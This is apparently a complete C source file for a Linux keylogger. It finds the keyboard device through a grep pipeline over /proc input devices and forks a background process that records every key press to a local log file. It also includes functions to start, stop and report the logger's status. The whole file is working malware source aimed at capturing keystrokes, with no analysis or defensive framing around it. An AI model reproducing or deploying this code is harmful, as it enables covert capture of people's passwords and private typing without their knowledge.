#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <sys/wait.h>

#define MAX_EVENT_STR_LEN 10
#define MAX_INPUT_PATH_LEN 256

pid_t keylogger_pid = -1;
char timestamp[128];

// Function to find the keyboard event device
char *event_keyboard(void) {
    FILE *eventx;
    char event_str[MAX_EVENT_STR_LEN];
    char *keyboard_file = NULL;
    char input[MAX_INPUT_PATH_LEN] = "/dev/input/";
    char event_grep[MAX_INPUT_PATH_LEN] = 
        "grep -E 'Handlers|EV=' /proc/bus/input/devices | "
        "grep -B1 'EV=120013' | grep -Eo 'event[0-9]{1,2}'";

    eventx = popen(event_grep, "r");
    if (!eventx) {
        perror("Error running grep command");
        return NULL;
    }

    if (fgets(event_str, MAX_EVENT_STR_LEN, eventx) == NULL) {
        perror("Error reading event device");
        pclose(eventx);
        return NULL;
    }

    event_str[strcspn(event_str, "\n")] = 0;
    strcat(input, event_str);
    keyboard_file = strdup(input);
    pclose(eventx);

    return keyboard_file;
}

void initialize_keylogger() {
    const char *log_file = "keylog.txt";
    const char *status_file = "keylogger_status.txt";
    char status[16];

    // Check the current status from the status file
    int fd_status = open(status_file, O_RDONLY);
    if (fd_status >= 0) {
        ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
        close(fd_status);

        if (bytes_read > 0) {
            status[bytes_read] = '\0'; // Null-terminate the status string
            if (strncmp(status, "running", 7) == 0) {
                printf("Keylogger is already running.\n");
                return;
            }
        }
    }

    if (keylogger_pid > 0) {
        printf("Keylogger is already running.\n");
        return;
    }

    keylogger_pid = fork();
    if (keylogger_pid < 0) {
        perror("Failed to fork keylogger process");
        exit(1);
    }

    if (keylogger_pid == 0) { // Child process
        char *keyboard_device = event_keyboard();
        if (!keyboard_device) {
            fprintf(stderr, "Failed to find keyboard event device.\n");
            exit(1);
        }

        struct input_event ev;
        int fd_input = open(keyboard_device, O_RDONLY);
        free(keyboard_device);

        if (fd_input < 0) {
            perror("Failed to open input device");
            exit(1);
        }

        int fd_log = open(log_file, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd_log < 0) {
            perror("Failed to open log file");
            close(fd_input);
            exit(1);
        }

        const char *key_map[] = {
            "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
            "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
            "o", "p", "[", "]", "ENTER", "LEFTCTRL", "a", "s", "d", "f", "g", "h",
            "j", "k", "l", ";", "'", "`", "LEFTSHIFT", "\\", "z", "x", "c", "v",
            "b", "n", "m", ",", ".", "/", "RIGHTSHIFT", "KPASTERISK", "LEFTALT",
            "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
            "F9", "F10"
        };

        //Keylogger session record message
        time_t now = time(NULL);
        char *time_str = ctime(&now);

        if (time_str && time_str[strlen(time_str) - 1] == '\n') {
            time_str[strlen(time_str) - 1] = '\0';
        }

        snprintf(timestamp, sizeof(timestamp), "\n--- Keylogger Session Start: %s ---\n", time_str);
        write(fd_log, timestamp, strlen(timestamp));

        while (1) {
            if (read(fd_input, &ev, sizeof(ev)) > 0) {
                if (ev.type == EV_KEY && ev.value == 1) {
                    if (ev.code < sizeof(key_map) / sizeof(key_map[0])) {
                        const char *key = key_map[ev.code];
                        snprintf(timestamp, sizeof(timestamp), "Key pressed: %s\n", key);
                        write(fd_log, timestamp, strlen(timestamp));
                    }
                }
            }
        }

        close(fd_log);
        close(fd_input);
        exit(0);
    }

    // Parent process: Update status file
    fd_status = open("keylogger_status.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_status < 0) {
        perror("Failed to update keylogger status");
    } else {
        char status[32];
        snprintf(status, sizeof(status), "running %d\n", keylogger_pid);
        write(fd_status, status, strlen(status));
        close(fd_status);
    }

    printf("Keylogger started with PID %d.\n", keylogger_pid);
}

void stop_keylogger() { 
    const char *status_file = "keylogger_status.txt";
    const char *log_file = "keylog.txt";
    char status[32];
    pid_t pid_from_file = -1;

    // Check the current status and PID from keylogger_status.txt
    int fd_status = open(status_file, O_RDONLY);
    if (fd_status < 0) {
        perror("Failed to read keylogger status");
        printf("Keylogger status unknown. Assuming it is not running.\n");
        return;
    }

    ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
    close(fd_status);

    if (bytes_read > 0) {
        status[bytes_read] = '\0'; // Null-terminate the string
        if (sscanf(status, "running %d", &pid_from_file) == 1) {
            keylogger_pid = pid_from_file;
        } else if (strncmp(status, "stopped", 7) == 0) {
            printf("Keylogger is already stopped.\n");
            return;
        }
    }

    // Check if the keylogger process is running
    if (keylogger_pid > 0 && kill(keylogger_pid, 0) == 0) {
        // Open the log file
        int fd_log = open(log_file, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd_log < 0) {
            perror("Failed to open log file");
            return;
        }

        // Log the session end
        time_t now = time(NULL);
        char *time_str = ctime(&now);
        if (time_str && time_str[strlen(time_str) - 1] == '\n') {
            time_str[strlen(time_str) - 1] = '\0';
        }

        snprintf(timestamp, sizeof(timestamp), "\n--- Keylogger Session End: %s ---\n", time_str);
        write(fd_log, timestamp, strlen(timestamp));
        close(fd_log);

        // Terminate the keylogger process
        if (kill(keylogger_pid, SIGINT) < 0) {
            perror("Failed to stop the keylogger process. Ensure you have the correct permissions.");
            return;
        }
        waitpid(keylogger_pid, NULL, 0);
        printf("Keylogger stopped.\n");
        keylogger_pid = -1;

        // Update status file to "stopped"
        fd_status = open(status_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_status < 0) {
            perror("Failed to update keylogger status");
        } else {
            write(fd_status, "stopped\n", 8);
            close(fd_status);
        }
    } else {
        printf("Keylogger is not running.\n");
    }
}

void check_keylogger_status() {
    char status[16];
    int fd_status = open("keylogger_status.txt", O_RDONLY);
    if (fd_status < 0) {
        perror("Failed to read keylogger status");
        printf("Keylogger status unknown.\n");
        return;
    }

    ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
    if (bytes_read > 0) {
        status[bytes_read] = '\0'; // Null-terminate
        printf("Keylogger status: %s", status);
    } else {
        printf("Keylogger status unknown.\n");
    }

    close(fd_status);
}
